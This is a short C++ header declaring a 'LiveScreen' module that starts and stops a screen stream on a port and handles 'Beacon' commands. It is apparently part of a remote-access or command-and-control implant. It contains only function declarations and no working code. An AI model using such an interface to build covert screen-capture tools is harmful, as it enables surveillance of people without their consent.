#pragma once
#include "../beacon.h"

namespace LiveScreen {
    void Start(const std::string& params); // {"port": 0, "quality": 80, "fps": 15}
    void Stop();
    void OnCommand(const Beacon::Command& cmd);
    bool IsStreaming();
    int GetPort();
}